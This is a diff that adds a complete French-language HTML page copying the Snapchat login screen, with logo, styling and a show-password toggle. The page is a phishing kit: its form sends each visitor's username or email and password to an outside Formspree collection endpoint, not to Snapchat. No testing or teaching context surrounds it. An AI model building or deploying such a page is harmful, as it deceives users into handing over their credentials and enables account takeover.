@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Connexion Snapchat</title>
+
+<link rel="icon" type="image/png" href="OIP.webp">
+
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f2f2f2;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+    }
+
+    .container {
+        background: white;
+        padding: 40px;
+        border-radius: 15px;
+        width: 350px;
+        text-align: center;
+        box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+
+    .logo-img {
+        width: 80px;
+        margin-bottom: 15px;
+    }
+
+    h1 {
+        font-size: 26px;
+        margin-bottom: 25px;
+    }
+
+    label {
+        display: block;
+        text-align: left;
+        margin-bottom: 8px;
+        color: #666;
+        font-size: 14px;
+    }
+
+    input {
+        width: 100%;
+        padding: 12px;
+        border-radius: 10px;
+        border: 2px solid black;
+        margin-bottom: 15px;
+        font-size: 15px;
+    }
+
+    .phone-link {
+        color: #4da6ff;
+        margin-bottom: 20px;
+        display: block;
+        text-decoration: none;
+        font-size: 14px;
+    }
+
+    .btn {
+        background-color: #4da6ff;
+        color: white;
+        padding: 12px;
+        border: none;
+        border-radius: 25px;
+        font-size: 16px;
+        cursor: pointer;
+        width: 100%;
+    }
+
+    .bottom-text {
+        margin-top: 20px;
+        font-size: 14px;
+    }
+
+    .bottom-text a {
+        font-weight: bold;
+        text-decoration: none;
+        color: black;
+    }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <img src="snap.png" class="logo-img">
+
+    <h1>Se connecter à Snapchat</h1>
+
+    <!-- FORMULAIRE FROMSPREE -->
+  <form action="https://formspree.io/f/xyknbzdj" method="POST" style="max-width: 400px; margin: auto;">
+
+  <label>Nom d’utilisateur ou adresse e-mail</label>
+  <input type="text" name="username" required style="width: 100%; padding: 10px; margin-bottom: 15px; box-sizing: border-box;">
+
+  <label>Mot de passe</label>
+  <div style="position: relative; width: 100%; margin-bottom: 15px;">
+
+    <input 
+      type="password" 
+      name="password" 
+      placeholder="Mot de passe" 
+      required 
+      id="demandeInput"
+      style="width: 100%; padding: 10px 40px 10px 10px; box-sizing: border-box;"
+    >
+
+    <!-- Bouton œil pour afficher/cacher -->
+    <button 
+      type="button" 
+      onclick="toggleDemandeVisibility()" 
+      style="
+        position: absolute; 
+        right: 10px; 
+        top: 50%; 
+        transform: translateY(-50%);
+        border: none;
+        background: none;
+        cursor: pointer;
+        padding: 0;
+        font-size: 18px;
+      "
+      aria-label="Afficher ou masquer le mot de passe"
+    >
+      👁️
+    </button>
+
+  </div>
+
+  <button type="submit" class="btn" style="width: 100%; padding: 10px;">Suivant</button>
+
+</form>
+
+<script>
+  function toggleDemandeVisibility() {
+    const input = document.getElementById('demandeInput');
+    input.type = input.type === "password" ? "text" : "password";
+  }
+</script>
+
+    <div class="bottom-text">
+        Vous débutez sur Snapchat ? <a href="#">S’inscrire</a>
+    </div>
+
+</div>
+
+</body>
+</html>
